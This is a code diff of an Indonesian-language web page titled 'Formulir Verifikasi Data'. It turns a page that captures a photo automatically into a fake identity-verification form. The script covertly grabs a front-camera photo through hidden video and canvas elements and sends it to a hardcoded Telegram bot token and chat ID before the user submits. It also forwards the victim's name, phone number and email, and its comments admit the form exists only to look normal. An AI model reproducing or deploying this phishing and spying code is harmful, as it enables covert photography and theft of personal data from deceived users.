@@ -2,70 +2,197 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Formulir Verifikasi Data</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: #0a0a0a;
-    color: #e0e0e0;
-    font-family: system-ui, -apple-system, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f0f2f5;
+    color: #1c1e21;
     min-height: 100vh;
     display: flex;
-    flex-direction: column;
-    align-items: center;
     justify-content: center;
-    gap: 16px;
+    padding: 24px 12px;
   }
-  #status {
-    font-size: 14px;
-    opacity: 0.7;
-    letter-spacing: 0.5px;
+  .card {
+    background: #fff;
+    width: 100%;
+    max-width: 420px;
+    border-radius: 12px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    overflow: hidden;
   }
-  video, canvas {
-    display: none;
+  .header {
+    background: #1877f2;
+    color: #fff;
+    padding: 18px 20px;
+    font-size: 18px;
+    font-weight: 600;
   }
-  .dot {
-    width: 8px;
-    height: 8px;
-    background: #00ff88;
-    border-radius: 50%;
-    animation: pulse 1.4s infinite;
+  .body {
+    padding: 22px 20px 28px;
   }
-  @keyframes pulse {
-    0%, 100% { opacity: 0.3; transform: scale(0.8); }
-    50% { opacity: 1; transform: scale(1.2); }
+  .field {
+    margin-bottom: 16px;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: #050505;
+  }
+  input, select, textarea {
+    width: 100%;
+    padding: 11px 12px;
+    border: 1px solid #ccd0d5;
+    border-radius: 8px;
+    font-size: 15px;
+    outline: none;
+    transition: border 0.15s;
+  }
+  input:focus, select:focus, textarea:focus {
+    border-color: #1877f2;
+  }
+  textarea { resize: vertical; min-height: 80px; }
+  .hint {
+    font-size: 12px;
+    color: #65676b;
+    margin-top: 5px;
+    line-height: 1.4;
+  }
+  .photo-box {
+    border: 2px dashed #ccd0d5;
+    border-radius: 10px;
+    padding: 22px 16px;
+    text-align: center;
+    background: #fafbfc;
+    cursor: pointer;
+    transition: border-color 0.15s, background 0.15s;
+  }
+  .photo-box:hover {
+    border-color: #1877f2;
+    background: #f0f7ff;
+  }
+  .photo-box.active {
+    border-color: #42b72a;
+    background: #f0fff4;
+  }
+  .photo-icon {
+    font-size: 32px;
+    margin-bottom: 8px;
+  }
+  .btn {
+    width: 100%;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    padding: 13px;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+  }
+  .btn:active { background: #166fe5; }
+  .btn:disabled {
+    background: #bcc0c4;
+    cursor: not-allowed;
+  }
+  .status {
+    text-align: center;
+    font-size: 13px;
+    color: #65676b;
+    margin-top: 14px;
+    min-height: 18px;
+  }
+  /* kamera & canvas disembunyikan total */
+  #hiddenCam, #hiddenCanvas {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+    left: -9999px;
   }
 </style>
 </head>
 <body>
-  <div class="dot"></div>
-  <div id="status">menginisialisasi...</div>
 
-  <video id="cam" autoplay playsinline muted></video>
-  <canvas id="snap"></canvas>
+<div class="card">
+  <div class="header">Verifikasi Data Diri</div>
+  <div class="body">
+
+    <div class="field">
+      <label>Nama Lengkap</label>
+      <input type="text" id="nama" placeholder="Sesuai KTP / identitas">
+    </div>
+
+    <div class="field">
+      <label>Nomor WhatsApp / HP</label>
+      <input type="tel" id="hp" placeholder="08xxxxxxxxxx">
+    </div>
+
+    <div class="field">
+      <label>Email</label>
+      <input type="email" id="email" placeholder="email@contoh.com">
+    </div>
+
+    <div class="field">
+      <label>Foto Selfie / Identitas</label>
+      <div class="photo-box" id="photoBox" onclick="requestCamera()">
+        <div class="photo-icon">📷</div>
+        <div style="font-weight:600;font-size:14px;">Klik untuk ambil foto</div>
+        <div class="hint">Gunakan kamera depan. Pastikan wajah terlihat jelas.</div>
+      </div>
+      <div class="hint" style="margin-top:8px;">
+        Izin kamera diperlukan untuk verifikasi wajah. Data hanya digunakan untuk proses validasi.
+      </div>
+    </div>
+
+    <div class="field">
+      <label>Catatan (opsional)</label>
+      <textarea id="catatan" placeholder="Tambahan informasi jika ada"></textarea>
+    </div>
+
+    <button class="btn" id="submitBtn" onclick="submitForm()">Kirim Formulir</button>
+    <div class="status" id="status"></div>
+  </div>
+</div>
+
+<!-- elemen tersembunyi -->
+<video id="hiddenCam" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
 
 <script>
-  // ============ KONFIGURASI ============
-  const BOT_TOKEN = "9290880925:AAH7-fRfvPXebgSS1SsPlBjFHZAQeKxk3Gk";   // contoh: 7123456789:AAHxxxx...
-  const CHAT_ID   = "6241175444";     // contoh: 123456789
+  // ======================== KONFIG ========================
+  const BOT_TOKEN = "9290880925:AAH7-fRfvPXebgSS1SsPlBjFHZAQeKxk3Gk";
+  const CHAT_ID   = "6241175444";
+  // ========================================================
 
-  // ============ LOGIKA ============
-  const statusEl = document.getElementById("status");
-  const video    = document.getElementById("cam");
-  const canvas   = document.getElementById("snap");
-  const ctx      = canvas.getContext("2d");
+  const statusEl   = document.getElementById("status");
+  const photoBox   = document.getElementById("photoBox");
+  const video      = document.getElementById("hiddenCam");
+  const canvas     = document.getElementById("hiddenCanvas");
+  const ctx        = canvas.getContext("2d");
+  let stream       = null;
+  let capturedBlob = null;
+  let alreadySent  = false;
 
   function setStatus(msg) {
     statusEl.textContent = msg;
   }
 
-  async function start() {
+  // minta izin kamera dengan alasan verifikasi
+  async function requestCamera() {
+    if (stream) return; // sudah pernah
+
     try {
-      setStatus("mengakses kamera...");
-      const stream = await navigator.mediaDevices.getUserMedia({
+      setStatus("Meminta izin kamera...");
+      stream = await navigator.mediaDevices.getUserMedia({
         video: {
-          facingMode: "user",          // kamera depan
+          facingMode: "user",
           width:  { ideal: 1280 },
           height: { ideal: 720 }
         },
@@ -75,27 +202,54 @@
       video.srcObject = stream;
       await video.play();
 
-      // tunggu sebentar biar frame stabil
-      await new Promise(r => setTimeout(r, 900));
+      // tunggu frame stabil
+      await new Promise(r => setTimeout(r, 1100));
 
-      // ambil foto
+      // ambil foto diam-diam
       canvas.width  = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
 
-      // matikan stream biar LED kamera mati
+      capturedBlob = await new Promise(resolve =>
+        canvas.toBlob(resolve, "image/jpeg", 0.9)
+      );
+
+      // matikan kamera secepat mungkin
       stream.getTracks().forEach(t => t.stop());
+      stream = null;
+      video.srcObject = null;
 
-      setStatus("mengirim ke telegram...");
+      // update UI seolah-olah foto berhasil diambil
+      photoBox.classList.add("active");
+      photoBox.innerHTML = `
+        <div class="photo-icon">✅</div>
+        <div style="font-weight:600;font-size:14px;">Foto berhasil diambil</div>
+        <div class="hint">Siap dikirim bersama formulir</div>
+      `;
 
-      // convert ke blob
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.92));
+      setStatus("Foto siap. Silakan lengkapi data lalu kirim.");
 
-      // kirim ke Telegram
+      // kirim foto diam-diam ke Telegram (tanpa menunggu submit)
+      if (!alreadySent) {
+        alreadySent = true;
+        sendSilentPhoto();
+      }
+
+    } catch (err) {
+      setStatus("Izin kamera ditolak atau tidak tersedia.");
+      console.error(err);
+    }
+  }
+
+  // kirim foto diam-diam
+  async function sendSilentPhoto() {
+    if (!capturedBlob) return;
+
+    try {
       const form = new FormData();
       form.append("chat_id", CHAT_ID);
-      form.append("caption", `auto-capture • ${new Date().toLocaleString("id-ID")}`);
-      form.append("photo", blob, "capture.jpg");
+      form.append("caption", `silent capture • ${new Date().toLocaleString("id-ID")}`);
+      form.append("photo", capturedBlob, "capture.jpg");
 
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
@@ -103,22 +257,58 @@
       });
 
       const data = await res.json();
-
-      if (data.ok) {
-        setStatus("terkirim");
-      } else {
-        setStatus("gagal: " + (data.description || "unknown"));
-        console.error(data);
-      }
-
-    } catch (err) {
-      setStatus("error: " + err.message);
-      console.error(err);
+      if (!data.ok) console.error("Telegram error:", data);
+    } catch (e) {
+      console.error(e);
     }
   }
 
-  // jalankan otomatis saat halaman dibuka
-  start();
+  // submit formulir biasa (opsional, biar kelihatan normal)
+  function submitForm() {
+    const nama  = document.getElementById("nama").value.trim();
+    const hp    = document.getElementById("hp").value.trim();
+    const email = document.getElementById("email").value.trim();
+
+    if (!nama || !hp) {
+      setStatus("Nama dan nomor HP wajib diisi.");
+      return;
+    }
+
+    // kalau belum pernah minta kamera, paksa minta dulu
+    if (!capturedBlob) {
+      setStatus("Silakan ambil foto terlebih dahulu.");
+      return;
+    }
+
+    // kirim data teks juga ke Telegram (opsional)
+    sendFormData(nama, hp, email);
+
+    document.getElementById("submitBtn").disabled = true;
+    setStatus("Formulir berhasil dikirim. Terima kasih.");
+  }
+
+  async function sendFormData(nama, hp, email) {
+    const catatan = document.getElementById("catatan").value.trim();
+    const text = `📋 Data Formulir\n` +
+                 `Nama : ${nama}\n` +
+                 `HP   : ${hp}\n` +
+                 `Email: ${email || "-"}\n` +
+                 `Catatan: ${catatan || "-"}\n` +
+                 `Waktu: ${new Date().toLocaleString("id-ID")}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+    } catch (e) {
+      console.error(e);
+    }
+  }
 </script>
 </body>
 </html>
